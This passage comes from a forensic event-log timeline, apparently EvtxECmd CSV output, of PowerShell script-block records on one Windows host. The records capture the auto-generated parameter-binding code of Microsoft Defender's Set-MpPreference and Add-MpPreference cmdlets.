$__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {,           [object]$__cmdletization_value = ${DisableCatchupFullScan},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {,           [object]$__cmdletization_value = ${DisableCatchupQuickScan},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {,           [object]$__cmdletization_value = ${DisableEmailScanning},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('Disab...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0548351,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: ion_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {,           [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {,           [object]$__cmdletization_value = ${DisableScanningNetworkFiles},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('UILockdown')) {,           [object]$__cmdletization_value = ${UILockdown},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {,           [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {,           [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {,           [object]$__cmdletization_value = ${UnknownThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {,           [object]$__cmdletization_value = ${LowThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {,           [object]$__cmdletization_value = ${ModerateThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {,           [object]$__cmdletization_value = ${HighThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {,           [object]$__cmdletization_value = ${SevereThreatDefaultAction},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresen...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0548704,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('PUAProtection')) {,           [object]$__cmdletization_value = ${PUAProtection},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {,           [object]$__cmdletization_value = ${CloudBlockLevel},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {,           [object]$__cmdletization_value = ${CloudExtendedTimeout},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {,           [object]$__cmdletization_value = ${EnableNetworkProtection},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {,           [object]$__cmdletization_value = ${EnableControlledFolderAccess},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {,           [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {,           [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {,           [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_metho...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0548856,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: Key('EnableFileHashComputation')) {,           [object]$__cmdletization_value = ${EnableFileHashComputation},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),       $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false },       $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue),       $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Set-MpPreference' -Alias '*',         , function Add-MpPreference, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionPath},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionExtension},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionProcess},,     [Parameter(ParameterSetName='Add1')],     [Alias('tiddefaci')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [long[]],     ${ThreatIDDefaultAction_Ids},,     [Parameter(ParameterSetName='Add1')],     [Alias('tiddefaca')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]],     ${ThreatIDDefaultAction_Actions},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionOnlyExclusions},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessAllowedApplications},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ControlledFolderAccessProtectedFolders},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${AttackSurfaceReductionRules_Ids},,     [Parameter(ParameterSetName='Add1')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]],     ${AttackSurfaceReductionRules_Actions},,     [Parameter(ParameterSetName='Add1')],     [switch],     ${Force},,     [Parameter(ParameterSetName='Add1')],     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [Parameter(ParameterSetName='Add1')],     [int],     ${ThrottleLimit},,     [Parameter(ParameterSetName='Add1')],     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,       $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new(),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionPath')) {,           [object]$__cmdletization_value = ${ExclusionPath},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {,           [object]$__cmdletization_value = ${ExclusionExtension},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {,           [object]$__cmdletization_value = ${ExclusionProcess},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {,           [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent},         },         $__cmdletization_methodParameters.Add($__cmdletization_methodParameter),         [object]$__cmdletization_defaultValue = $null,         [object]$__cmdletization_defaultValueIsPresent = $false,         if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {,           [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions},           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true},         } else {,           $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = 